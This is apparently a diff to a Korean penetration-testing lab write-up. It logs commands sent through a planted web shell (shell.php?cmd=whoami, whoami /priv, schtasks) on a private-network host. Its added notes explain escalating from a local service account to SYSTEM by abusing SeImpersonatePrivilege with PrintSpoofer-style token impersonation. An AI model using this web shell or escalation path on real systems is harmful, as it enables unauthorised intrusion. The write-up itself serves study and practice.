@@ -1138,6 +1138,9 @@ http://192.168.58.189:8080/shell.php?cmd=whoami
 
 nt authority\local service
 
+- local service -> 계정 탈취 성공 -> 일반적으로 기본 권한을 포함하는 경우가 많음 -> 가장 기능 활성화 확인
+- 최상위 SYSTEM 권한 탈취 필요
+
 http://192.168.58.189:8080/shell.php?cmd=whoami%20/priv
 
 ![](image_8.png)
@@ -1152,3 +1155,12 @@ SeImpersonatePrivilege Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege Create global objects Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 SeTimeZonePrivilege Change the time zone Disabled
+
+# SeImpersonatePrivilege -> enabled -> 일시적 사용자 권한을 가장하여 수행
+
+공격자는 이 권한을 악용해 시스템 내부에서 실행 중인 권한 높은 서비스(예: Print Spooler 등)가 자신(공격자의 프로세스)에게 강제로 인증을 시도하도록 만듭니다.
+시스템 서비스가 인증을 위해 보낸 토큰을 가로채서 그 토큰을 이용해 프로세스를 실행하면, 최고 관리자 권한인 SYSTEM으로 권한이 수직 상승하게 됩니다. (이것이 바로 PrintSpoofer 같은 도구가 작동하는 방식입니다.
+
+- ![](image_9.png)
+  schtasks /query /fo LIST /v -> 자동화된 명령어 탐색
+  http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v
